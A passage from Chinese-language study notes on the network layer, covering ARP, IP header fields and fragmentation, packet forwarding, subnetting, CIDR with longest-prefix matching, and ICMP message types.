B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。如没有， ARP 进程在本局域网上广播发送一个 ARP 请求分组。收到 ARP 响应分组后，将得到的 IP 地址到硬件地址的映射写入 ARP 高速缓存。（和那啥是不是有点类似，数据链路层中交换机的工作方式）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415204254478.png" alt="image-20210415204254478"></p><p>解剖整段话中的要点</p><blockquote><p><strong>ARP请求分组：</strong>包含发送方硬件地址 / 发送方 IP 地址 / 目标方硬件地址(未知时填 0) / 目标方 IP 地址。</p><p><strong>本地广播 ARP 请求</strong>（路由器不转发ARP请求）。</p><p><strong>ARP 响应分组</strong>：包含发送方硬件地址 / 发送方 IP地址 / 目标方硬件地址 / 目标方 IP 地址。</p><p><strong>ARP 分组封装在物理网络的帧中传输。</strong></p></blockquote><h3 id="ARP-高速缓存"><a href="#ARP-高速缓存" class="headerlink" title="ARP 高速缓存"></a>ARP 高速缓存</h3><p>ARP 具有高速缓存，用来存放最近获得的 IP 地址到 MAC 地址的绑定，以减少 ARP 广播的数量。</p><p>为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 </p><p>如果目的主机不在本局域网呢</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415204653510.png" alt="image-20210415204653510"></p><p>ARP 用于解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。如果所要找的主机和源主机不在同一个局域网上，<strong>那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址</strong>，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做。</p><p>从 IP 地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。 </p><p>最后，总结下使用ARP会遇到的四种典型情况</p><h3 id="不同应用场景"><a href="#不同应用场景" class="headerlink" title="不同应用场景"></a>不同应用场景</h3><ol><li><strong>发送方是主机</strong>，要把 IP 数据报发送到<strong>本网络上的另一个主机</strong>。这时用 ARP 找到目的主机的硬件地址。 </li><li>发送方是主机，要把 IP 数据报发送到<strong>另一个网络上的一个主机</strong>。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 </li><li><strong>发送方是路由器</strong>，要把 IP 数据报转发到<strong>本网络上的一个主机</strong>。这时用 ARP 找到目的主机的硬件地址。 </li><li><strong>发送方是路由器</strong>，要把 IP 数据报转发到<strong>另一个网络上的一个主机</strong>。这时用 ARP 找到本网络上另一个路由器的硬件地址。剩下的工作由这个路由器来完成。 </li></ol><h3 id="为什么不直接使用硬件地址？"><a href="#为什么不直接使用硬件地址？" class="headerlink" title="为什么不直接使用硬件地址？"></a>为什么不直接使用硬件地址？</h3><p>由于全世界存在着各式各样的网络，它们使用不同的硬件地址。要使这些异构网络能够互相通信就必须进行非常复杂的硬件地址转换工作，因此几乎是不可能的事。想想看，若一台主机要跨交换机进行通信，那么他的数据是被无数个交换机所接收的，只有目的主机的交换机才会收下这部分数据，对比路由器，可以针对性对目标主机所在的局域网进行传递，至少不用像交换机一样进行广播，节省了多少资源，详细可以看看数据链路层的交换机工作方式，对比下路由器。</p><p>还有，调用 ARP 的复杂过程都是由计算机软件自动进行的，对用户来说是看不见这种调用过程的。因此，在虚拟的 IP 网络上用 IP 地址进行通信给广大的计算机用户带来了很大的方便。</p><h2 id="IP-数据报的格式"><a href="#IP-数据报的格式" class="headerlink" title="IP 数据报的格式"></a><strong>IP 数据报的格式</strong></h2><p>一个 IP 数据报由首部和数据两部分组成。首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。在首部的固定部分的后面是一些可选字段，其长度是可变的。 </p><p>纵向来看</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415205509911.png" alt="image-20210415205509911"></p><p>横向简化版</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415205526556.png" alt="image-20210415205526556"></p><p>首部的前一部分是固定长度，共 <strong>20 字节</strong>，是所有 IP 数据报必须具有的。可选字段，其长度是可变的。</p><h3 id="IP-数据报首部的固定部分中的各字段"><a href="#IP-数据报首部的固定部分中的各字段" class="headerlink" title="IP 数据报首部的固定部分中的各字段"></a>IP 数据报首部的固定部分中的各字段</h3><ol><li><p>版本——占 4 位，指 IP 协议的版本。目前的 IP 协议版本号为 4 (即 IPv4)。</p></li><li><p>首部长度——占 4 位，可表示的最大数值是 15 个单位(一个单位为 4 字节)，因此 IP 的首部长度的最大值是 60 字节。</p></li><li><p>区分服务——占 8 位，用来获得更好的服务。在旧标准中叫做服务类型，但实际上一直未被使用过。1998 年这个字段改名为区分服务。只有在使用区分服务（DiffServ）时，这个字段才起作用。在一般的情况下都不使用这个字段 </p></li><li><p>总长度——占 16 位，指首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。总长度必须不超过最大传送单元MTU。 </p></li><li><p>标识(identification) ——占 16 位，它是一个计数器，用来产生 IP 数据报的标识。 </p></li><li><p><strong>标志(flag)</strong> ——占 3 位，目前只有前两位有意义。标志字段的最低位是 MF (More Fragment)。MF=1 表示后面“还有分片”。MF=0 表示最后一个分片。标志字段中间的一位是 DF (Don’t Fragment) 。只有当 DF=0 时才允许分片。 </p></li><li><p><strong>片偏移</strong>——占13 位，指出：较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</p></li><li><p><strong>生存时间</strong>——占8 位，记为 TTL (Time To Live)，指示数据报在网络中可通过的路由器数（也称跳数，最大值为255）的最大值。防止无法交付的数据报在互联网中无限制的兜圈子。</p></li><li><p>协议——占8 位，指出此数据报携带的数据使用何种协议，以便目的主机的 IP 层将数据部分上交给那个处理过程（在之后的运输层以及网络层会涉及到更多协议）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415212725311.png" alt="image-20210415212725311"></p></li><li><p>首部检验和——占16 位，只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415212818822.png" alt="image-20210415212818822"></p></li><li><p>源地址和目的地址都各占 4 字节</p></li></ol><p>其中，对于<strong>标志</strong>以及<strong>片偏移</strong>，这里通过一个例子加深理解</p><p>一数据报的总长度为 3820 字节，其数据部分的长度为 3800 字节（使用固定首部），需要分片为长度不超过 1420 字节的数据报片。<br>因固定首部长度为 20 字节，因此每个数据报片的数据部分长度不能超过 1400 字节。于是分为 3 个数据报片，其数据部分的长度分别为 1400、1400 和 1000 字节。<strong>原始数据报首部被复制为各数据报片的首部，但必须修改有关字段的值</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415212526446.png" alt="image-20210415212526446"></p><p>IP 数据报首部中与分片有关的字段中的数值</p><table><thead><tr><th></th><th>总长度</th><th>标识</th><th>MF</th><th>DF</th><th>片偏移</th></tr></thead><tbody><tr><td>原始数据报</td><td>3820</td><td>12345</td><td>0</td><td>0</td><td>0</td></tr><tr><td>数据报片1</td><td>1420</td><td>12345</td><td>1</td><td>0</td><td>0</td></tr><tr><td>数据报片2</td><td>1420</td><td>12345</td><td>1</td><td>0</td><td>175</td></tr><tr><td>数据报片3</td><td>1020</td><td>12345</td><td>0</td><td>0</td><td>350</td></tr></tbody></table><h3 id="IP-数据报首部的可变部分"><a href="#IP-数据报首部的可变部分" class="headerlink" title="IP 数据报首部的可变部分"></a>IP 数据报首部的可变部分</h3><p>IP 首部的可变部分就是一个选项字段，用来支持<strong>排错、测量以及安全等</strong>措施，内容很丰富。选项字段的长度可变，<strong>从 1 个字节到 40 个字节不等</strong>，取决于所选择的项目。增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。<strong>实际上这些选项很少被使用。</strong></p><h2 id="IP-层转发分组的流程"><a href="#IP-层转发分组的流程" class="headerlink" title="IP 层转发分组的流程"></a><strong>IP 层转发分组的流程</strong></h2><p>假设：有四个 A 类网络通过三个路由器连接在一起。每一个网络上都可能有成千上万个主机。可以想象，若按目的主机号来制作路由表，每一个路由表就有 4 万个项目，即 4 万行（每一行对应于一台主机），则所得出的路由表就会过于庞大。但若按主机所在的网络地址来制作路由表，那么每一个路由器中的路由表就只包含 4 个项目（每一行对应于一个网络），这样就可使路由表大大简化。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415213715296.png" alt="image-20210415213715296"></p><p>在路由表中，对每一条路由，最主要的是（目的网络地址，下一跳地址） </p><h3 id="查找路由表"><a href="#查找路由表" class="headerlink" title="查找路由表"></a>查找路由表</h3><p>根据目的网络地址就能确定下一跳路由器，这样做的结果是：IP 数据报最终一定可以找到目的主机所在目的网络上的路由器（可能要通过多次的间接交付）。只有到达最后一个路由器时，才试图向目的主机进行直接交付。 </p><h3 id="特定主机路由"><a href="#特定主机路由" class="headerlink" title="特定主机路由"></a>特定主机路由</h3><p>虽然互联网所有的分组转发都是基于目的主机所在的网络，但在大多数情况下都允许有这样的特例，<strong>即为特定的目的主机指明一个路由</strong>。<br>采用特定主机路由可使网络管理人员能更方便地控制网络和测试网络，同时也可在需要考虑某种安全问题时采用这种特定主机路由。 </p><h3 id="默认路由-default-route"><a href="#默认路由-default-route" class="headerlink" title="默认路由 (default route)"></a>默认路由 (default route)</h3><p>路由器还可采用默认路由以减少路由表所占用的空间和搜索路由表所用的时间。这种转发方式在一个网络只有很少的对外连接时是很有用的。默认路由在主机发送 IP 数据报时往往更能显示出它的好处。如果一个主机连接在一个小网络上，而这个网络只用一个路由器和互联网连接，那么在这种情况下使用默认路由是非常合适的。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415213953578.png" alt="image-20210415213953578"></p><p>只要目的网络不是 N1 和 N2，就一律选择默认路由，把数据报先间接交付路由器 R1，让 R1 再转发给下一个路由器。 </p><p>必须指出</p><p>IP 数据报的首部中没有地方可以用来指明“下一跳路由器的 IP 地址”。当路由器收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的网络接口软件。网络接口软件<strong>使用 ARP</strong> 负责将下一跳路由器的 IP 地址转换成硬件地址，并将此硬件地址放在链路层的 MAC 帧的首部，然后根据这个硬件地址找到下一跳路由器。 </p><h3 id="路由器分组转发算法"><a href="#路由器分组转发算法" class="headerlink" title="路由器分组转发算法"></a>路由器分组转发算法</h3><ol><li>从数据报的首部提取目的主机的 IP 地址 D, 得出目的网络地址为 N。</li><li>若网络 N 与此路由器直接相连，则把数据报直接交付目的主机 D；否则是间接交付，执行 (3)。</li><li>若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给路由表中所指明的下一跳路由器；否则，执行 (4)。</li><li>若路由表中有到达网络 N 的路由，则把数据报传送给路由表指明的下一跳路由器；否则，执行 (5)。</li><li>若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；否则，执行 (6)。</li><li>报告转发分组出错。 </li></ol><p>最后，总结一下路由表：路由表没有给分组指明到某个网络的完整路径。路由表指出，到某个网络应当先到某个路由器（即下一跳路由器）。在到达下一跳路由器后，再继续查找其路由表，知道再下一步应当到哪一个路由器。这样一步一步地查找下去，直到最后到达目的网络。</p><h1 id="划分子网和构造超网"><a href="#划分子网和构造超网" class="headerlink" title="划分子网和构造超网"></a><strong>划分子网和构造超网</strong></h1><h2 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h2><p>两级IP地址到三级IP地址（了解）</p><p>一开始是只有网络号和主机号的，为了方便管理，就出现了下面的地址形式</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415215744413.png" alt="image-20210415215744413"></p><blockquote><p>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p></blockquote><p>划分子网思路如下</p><p>划分子网纯属一个<strong>单位内部的事情</strong>。单位对外仍然表现为没有划分子网的网络。从主机号借用若干个位作为子网号 subnet-id，而主机号 host-id 也就相应减少了若干个位。</p><p>凡是从其他网络发送给本单位某个主机的 IP 数据报，仍然是根据 IP 数据报的目的网络号 net-id，先找到连接在本单位网络上的路由器。<br>然后此路由器在收到 IP 数据报后，再按目的网络号 net-id 和子网号 subnet-id 找到目的子网。最后就将 IP 数据报直接交付目的主机。</p><p> 一个未划分子网的 B 类网络145.13.0.0（下图）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415220031670.png" alt="image-20210415220031670"></p><p>划分为三个子网，它对外仍是一个网络</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415220105427.png" alt="image-20210415220105427"></p><p>当没有划分子网时，IP 地址是两级结构。划分子网后 IP 地址就变成了三级结构。划分子网只是把 IP 地址的<strong>主机号 host-id 这部分进行再划分</strong>，而不改变 IP 地址原来的网络号 net-id。 </p><p>划分后的三级结构子网有什么优点呢</p><ol><li>减少了 IP 地址的浪费</li><li>使网络的组织更加灵活</li><li>更便于维护和管理</li></ol><p>划分子网纯属一个单位内部的事情，对外部网络透明，对外仍然表现为没有划分子网的一个网络。</p><h3 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h3><p>从一个 IP 数据报的首部并无法判断源主机或目的主机所连接的网络是否进行了子网划分。使用子网掩码 (subnet mask) 可以找出 IP 地址中的子网部分。  </p><p>规则：子网掩码长度 ＝ 32 位；子网掩码左边部分的一连串 1，对应于网络号和子网号；子网掩码右边部分的一连串 0，对应于主机号</p><p>也就是说，把设定的子网号包括网络号全部置为1，后面的全为0，代表分配给主机号 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415220909881.png" alt="image-20210415220909881"></p><p>很恨很重要的一条公式</p><blockquote><p><strong>(IP 地址) AND (子网掩码) =网络地址</strong></p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415221001845.png" alt="image-20210415221001845"></p><p>默认的子网掩码（下图）</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415221114137.png" alt="image-20210415221114137"></p><p>子网掩码是一个网络或一个子网的重要属性。路由器在和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉相邻路由器。路由器的路由表中的每一个项目，除了要给出目的网络地址外，还必须同时给出该网络的子网掩码。若一个路由器连接在两个子网上，就拥有两个网络地址和两个子网掩码。</p><h3 id="子网划分方法"><a href="#子网划分方法" class="headerlink" title="子网划分方法"></a>子网划分方法</h3><p>有<strong>固定长度子网</strong>和<strong>变长子网</strong>两种子网划分方法。</p><p>在采用固定长度子网时，所划分的所有子网的子网掩码都是相同的。<br>虽然根据已成为互联网标准协议的 RFC 950 文档，子网号不能为全 1 或全 0，但随着[<strong>无分类域间路由选择 CIDR</strong>](#无分类编址 CIDR（构造超网）) 的广泛使用，现在全 1 和全 0 的子网号也可以使用了，但一定要谨慎使用，确认你的路由器所用的路由选择软件是否支持全 0 或全 1 的子网号这种较新的用法。</p><p>划分子网增加了灵活性，但却减少了能够连接在网络上的主机总数。</p><p>B 类地址的子网划分选择（使用固定长度子网），如下图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415221507099.png" alt="image-20210415221507099"></p><p>表中的“子网号的位数”中没有 0, 1, 15 和 16 这四种情况，因为这没有意义。 </p><p><strong>来啦来啦，计算题来啦</strong></p><p>【例4-2】已知 IP 地址是 141.14.72.24，子网掩码是255.255.224.0。试求网络地址。 </p><p>解题思路图</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415221801814.png" alt="image-20210415221801814"></p><p>【例4-3】上例中，若子网掩码改为 255.255.224.0，试求网络地址，讨论所得结果。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415221850867.png" alt="image-20210415221850867"></p><p>通过解题发现了啥，不同的子网掩码对同一个ip地址得出相同的网络地址，但实际上不同的掩码的效果是不同的，这对后面学习无分类编址CIDR很重要，当对一个ip地址进行掩码处理后，你会发现可能多个网络号都对应得上，那么我们往往会选择更大的那一个，因为离得更近嘛。</p><h2 id="使用子网时分组的转发"><a href="#使用子网时分组的转发" class="headerlink" title="使用子网时分组的转发"></a>使用子网时分组的转发</h2><p>在不划分子网的两级 IP 地址下，从 IP 地址得出网络地址是个很简单的事。但在划分子网的情况下，从 IP 地址却不能唯一地得出网络地址来，这是因为网络地址取决于那个网络所采用的子网掩码，但数据报的首部并没有提供子网掩码的信息。因此分组转发的算法也必须做相应的改动。 看看改动后的算法是怎样的</p><ol><li>从收到的分组的首部提取<strong>目的 IP 地址 D</strong>。</li><li>先用各网络的<strong>子网掩码和 D 逐位相“与”</strong>，看是否和相应的网络地址匹配。若匹配，则将分组直接交付。否则就是间接交付，执行(3)。</li><li>若路由表中有目的地址为 D 的<strong>特定主机路由</strong>，则将分组传送给指明的下一跳路由器；否则，执行 (4)。</li><li>对路由表中的每一行，将<strong>子网掩码和 D 逐位相“与”</strong>。若结果与该行的目的网络地址匹配，则将分组传送给该行指明的下一跳路由器；否则，执行 (5)。</li><li>若路由表中有一个<strong>默认路由</strong>，则将分组传送给路由表中所指明的默认路由器；否则，执行 (6)。</li><li>报告转发分组出错。</li></ol><p>再来一题</p><p>【例4-4】已知互联网和路由器 R1 中的路由表。主机 H1 向 H2 发送分组。试讨论 R1 收到 H1 向 H2 发送的分组后查找路由表的过程。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415222745188.png" alt="image-20210415222745188"></p><p>H1 首先检查主机 128.30.33.138 是否连接在本网络上，如果是，则直接交付；否则，就送交路由器 R1，并逐项查找路由表。</p><p>主机 H1 首先将本子网的子网掩码 255.255.255.128与分组的 IP 地址 128.30.33.138 逐比特相与”(AND 操作) </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210415223100270.png" alt="image-20210415223100270"></p><p>因此 H1 必须把分组传送到路由器 R1，然后逐项查找路由表</p><p>路由器 R1 收到分组后就用路由表中第 1 个项目的子网掩码和 128.30.33.138 逐比特 AND 操作 ，然后如此下去，直到得出的网络地址和路由表中子网掩码的对应目的网络地址匹配</p><p>255.255.255.128 AND 128.30.33.138 = 128.30.33.128     不匹配!<br>（因为128.30.33.128 与路由表中的 128.30.33.0 不一致）</p><p>255.255.255.128 AND 128.30.33.138 = 128.30.33.128     匹配!<br>这表明子网 2 就是收到的分组所要寻找的目的网络。</p><h2 id="无分类编址-CIDR（构造超网）"><a href="#无分类编址-CIDR（构造超网）" class="headerlink" title="无分类编址 CIDR（构造超网）"></a>无分类编址 CIDR（构造超网）</h2><p>为了解决B 类地址分配快完的以及互联网主干网上的路由表中的项目数急剧增长（从几千个增长到几万个）的问题。</p><p>使用<strong>变长子网掩码 VLSM</strong> (Variable Length Subnet Mask)可进一步提高 IP 地址资源的利用率。</p><p>在 VLSM 的基础上又进一步研究出无分类编址方法，它的正式名字是<strong>无分类域间路由选择 CIDR</strong> (Classless Inter-Domain Routing)。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>CIDR 消除了传统的 A 类、B 类和 C 类地址以及划分子网的概念，因而可以更加有效地分配 IPv4 的地址空间。</li><li>CIDR使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号。</li><li>IP 地址从三级编址（使用子网掩码）又回到了两级编址。 </li></ul><p>无分类的两级编址的记法是</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416072608149.png" alt="image-20210416072608149"></p><blockquote><p>IP地址 ::= {&lt;网络前缀&gt;, &lt;主机号&gt;}</p></blockquote><p>为了同三级编址一样划分子网，CIDR 使用<strong>“斜线记法”(slash notation)</strong>，它又称为 CIDR 记法，即在 IP 地址里面加上一个<strong>斜线“/”</strong>，然后<strong>写上网络前缀所占的位数</strong>（这个数值对应于三级编址中子网掩码中 1 的个数）。例如： 220.78.168.0/24</p><h3 id="CIDR-地址块"><a href="#CIDR-地址块" class="headerlink" title="CIDR 地址块"></a>CIDR 地址块</h3><blockquote><p>CIDR 把网络前缀都相同的连续的 IP 地址组成“CIDR 地址块”。</p></blockquote><p>128.14.32.0/20 表示的地址块共有 212 个地址（因为斜线后面的 20 是网络前缀的位数，所以这个地址的主机号是 12 位）。</p><p>这个地址块的起始地址是 128.14.32.0。</p><p>在不需要指出地址块的起始地址时，也可将这样的地址块简称为“/20 地址块”。</p><p>128.14.32.0/20 地址块的最小地址：128.14.32.0</p><p>128.14.32.0/20 地址块的最大地址：128.14.47.255</p><h4 id="其他形式的记法"><a href="#其他形式的记法" class="headerlink" title="其他形式的记法"></a>其他形式的记法</h4><p>10.0.0.0/10 可简写为 10/10，也就是把点分十进制中低位连续的 0 省略。<br>10.0.0.0/10 隐含地指出 IP 地址 10.0.0.0 的掩码 255.192.0.0。此掩码可表示为：</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416073332167.png" alt="image-20210416073332167"></p><p>网络前缀的后面加一个星号 * 的表示方法，如 00001010 00*，在星号 * 之前是网络前缀，而星号 * 表示 IP 地址中的主机号，可以是任意值。 </p><p><strong>注意：全 0 和全 1 的主机号地址一般不使用。</strong></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416072842853.png" alt="image-20210416072842853"></p><h3 id="路由聚合-route-aggregation"><a href="#路由聚合-route-aggregation" class="headerlink" title="路由聚合 (route aggregation)"></a>路由聚合 (route aggregation)</h3><p>一个 CIDR 地址块可以表示很多地址，这种地址的聚合常称为路由聚合，它使得路由表中的一个项目可以表示很多个（例如上千个）原来传统分类地址的路由。路由聚合有利于减少路由器之间的路由选择信息的交换，从而提高了整个互联网的性能。<strong>路由聚合也称为构成超网 (supernetting)。</strong></p><p>简单来说，就是将一部分具有相同网络前缀以及掩码的地址聚合成一个整体</p><p>CIDR 虽然不使用子网了，但仍然使用“掩码”这一名词（但不叫子网掩码）。对于 /20  地址块，它的掩码是 20 个连续的 1。 斜线记法中的数字就是掩码中1的个数。 </p><p><strong>常用的CIDR地址块</strong></p><table><thead><tr><th>CIDR 前缀长度</th><th>点分十进制</th><th>包含的地址数</th><th>相当于包含分类的网络数</th></tr></thead><tbody><tr><td>/13</td><td>255.248.0.0</td><td>512 K</td><td>8 个   B类或  2048 个 C  类</td></tr><tr><td>/14</td><td>255.252.0.0</td><td>256 K</td><td>4 个 B  类或1024 个 C  类</td></tr><tr><td>/15</td><td>255.254.0.0</td><td>128 K</td><td>2 个 B  类或512 个 C  类</td></tr><tr><td>/16</td><td>255.255.0.0</td><td>64 K</td><td>1 个 B  类或256 个 C  类</td></tr><tr><td>/17</td><td>255.255.128.0</td><td>32 K</td><td>128 个 C  类</td></tr><tr><td>/18</td><td>255.255.192.0</td><td>16 K</td><td>64 个 C  类</td></tr><tr><td>/19</td><td>255.255.224.0</td><td>8 K</td><td>32 个 C  类</td></tr><tr><td>/20</td><td>255.255.240.0</td><td>4 K</td><td>16 个 C  类</td></tr><tr><td>/21</td><td>255.255.248.0</td><td>2 K</td><td>8 个 C  类</td></tr><tr><td>/22</td><td>255.255.252.0</td><td>1 K</td><td>4 个 C  类</td></tr><tr><td>/23</td><td>255.255.254.0</td><td>512</td><td>2 个 C  类</td></tr><tr><td>/24</td><td>255.255.255.0</td><td>256</td><td>1 个 C  类</td></tr><tr><td>/25</td><td>255.255.255.128</td><td>128</td><td>1/4 个 C  类</td></tr><tr><td>/26</td><td>255.255.255.192</td><td>64</td><td>1/4 个 C  类</td></tr><tr><td>/27</td><td>255.255.255.224</td><td>32</td><td>1/8 个 C  类</td></tr></tbody></table><p>前缀长度不超过 23 位的 CIDR 地址块都包含了多个 C  类地址。这些 C 类地址合起来就<strong>构成了超网</strong>。<strong>CIDR 地址块中的地址数一定是 2 的整数次幂</strong>。网络前缀越短，其地址块所包含的地址数就越多。而在<strong>三级结构的IP地址中，划分子网是使网络前缀变长</strong>。</p><p>CIDR 的一个好处是：可以更加有效地分配 IPv4 的地址空间，可根据客户的需要分配适当大小的 CIDR 地址块。 </p><p>比如下面的例子</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416073719888.png" alt="image-20210416073719888"></p><p>这个 ISP 共有 64 个 C 类网络。如果不采用 CIDR 技术，则在与该 ISP 的路由器交换路由信息的每一个路由器的路由表中，就需要有 64 个项目。但采用地址聚合后，只需用路由聚合后的 1 个项目 206.0.64.0/18 就能找到该 ISP。</p><h3 id="最长前缀匹配"><a href="#最长前缀匹配" class="headerlink" title="最长前缀匹配"></a>最长前缀匹配</h3><p>使用 CIDR 时，路由表中的每个项目由“网络前缀”和“下一跳地址”组成。在查找路由表时可能会得到不止一个匹配结果。 应当从匹配结果中选择具有最长网络前缀的路由：最长前缀匹配 (longest-prefix matching)。网络前缀越长，其地址块就越小，因而路由就越具体 (more specific) 。<strong>最长前缀匹配又称为最长匹配或最佳匹配。</strong></p><p>比如</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416073906784.png" alt="image-20210416073906784"></p><p>接着</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416073927958.png" alt="image-20210416073927958"></p><p>怎么选择呢，当然就是选择两个匹配的地址中更具体的一个，即选择最长前缀的地址。 这样就能更具体更快的找到主机所在网络啦</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416074031309.png" alt="image-20210416074031309"></p><h3 id="使用二叉线索查找路由表"><a href="#使用二叉线索查找路由表" class="headerlink" title="使用二叉线索查找路由表"></a>使用二叉线索查找路由表</h3><p>当路由表的项目数很大时，怎样设法减小路由表的查找时间就成为一个非常重要的问题。 为了进行更加有效的查找，通常是将无分类编址的路由表存放在一种<strong>层次的数据结构中，然后自上而下地按层次进行查找</strong>。这里最常用的就是二叉线索 (binary trie)。</p><p>IP 地址中从左到右的比特值决定了从根结点逐层向下层延伸的路径，而二叉线索中的各个路径就代表路由表中存放的各个地址。<br>为了提高二叉线索的查找速度，广泛使用了各种压缩技术。 </p><p>如下面的例子</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416074305521.png" alt="image-20210416074305521"></p><p>从二叉线索的根节点自顶向下的深度最多有 32 层，每一层对应于IP地址中的一位。一个IP地址存入二叉线索的规则很简单。先检查IP地址左边的第一位，如为 0，则第一层的节点就在根节点的左下方；如为 1，则在右下方。然后再检查地址的第二位，构造出第二层的节点。依此类推，直到唯一前缀的最后一位。</p><h1 id="网际控制报文协议-ICMP"><a href="#网际控制报文协议-ICMP" class="headerlink" title="网际控制报文协议 ICMP"></a><strong>网际控制报文协议 ICMP</strong></h1><h2 id="ICMP-报文的种类"><a href="#ICMP-报文的种类" class="headerlink" title="ICMP 报文的种类"></a>ICMP 报文的种类</h2><p>为了更有效地转发 IP 数据报和提高交付成功的机会，在网际层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。ICMP 是互联网的标准协议。</p><p>ICMP 允许<strong>主机或路由器报告差错情况和提供有关异常情况的报告</strong>。但 ICMP 不是高层协议（看起来好像是高层协议，因为 ICMP 报文是装在 IP 数据报中，作为其中的数据部分），而是 IP 层的协议。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416082346847.png" alt="image-20210416082346847"></p><p>ICMP 报文的种类有两种，即 <strong>ICMP 差错报告报文</strong>和 <strong>ICMP 询问报文</strong>。 ICMP 报文的前 4 个字节是统一的格式，共有三个字段：即<strong>类型、代码和检验和</strong>。接着的 4 个字节的内容与 ICMP 的类型有关。 </p><h3 id="ICMP-差错报告报文"><a href="#ICMP-差错报告报文" class="headerlink" title="ICMP 差错报告报文"></a>ICMP 差错报告报文</h3><p>ICMP 差错报告报文共有 4 种</p><ul><li>终点不可达 </li><li>时间超过 </li><li>参数问题 </li><li>改变路由（重定向）(Redirect) </li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20210416082743895.png" 